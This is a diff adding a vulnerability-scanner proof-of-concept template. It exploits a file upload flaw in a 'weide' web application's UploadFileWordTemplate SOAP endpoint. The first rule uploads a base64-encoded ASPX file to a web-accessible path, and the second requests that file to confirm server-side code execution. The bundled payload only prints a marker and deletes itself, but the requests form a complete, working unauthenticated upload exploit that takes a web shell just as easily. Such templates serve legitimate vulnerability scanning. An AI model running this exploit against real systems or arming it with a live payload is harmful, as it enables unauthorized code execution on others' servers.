@@ -1,0 +1,41 @@
+name: poc-yaml-weide-UploadFileWordTemplate-File-upload
+transport: http
+
+set:
+  username: randomLowercase(6)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /AutoUpdate/WSFM.asmx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/UploadFileWordTemplate"
+      body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <UploadFileWordTemplate xmlns="http://tempuri.org/">
+              <fileByteArray>PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT48JVJlc3BvbnNlLldyaXRlKCJwYm95am5ucmZpcG1wbHN1a2RlY3p1ZHNlZnhteXdlIik7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTslPg==</fileByteArray>
+              <remotePath>/TemplateFiles/{{username}}.aspx</remotePath>
+            </UploadFileWordTemplate>
+          </soap:Body>
+        </soap:Envelope>
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /TemplateFiles/{{username}}.aspx
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487586&idx=1&sn=fc63b2dfe79ca549f6d504451e358107&chksm=c267a551f5102c47a22c50ed217c6c7739903187584ebee7d892b975368fef9bf839f90dd2a4&token=1439003696&lang=zh_CN#rd
+
+
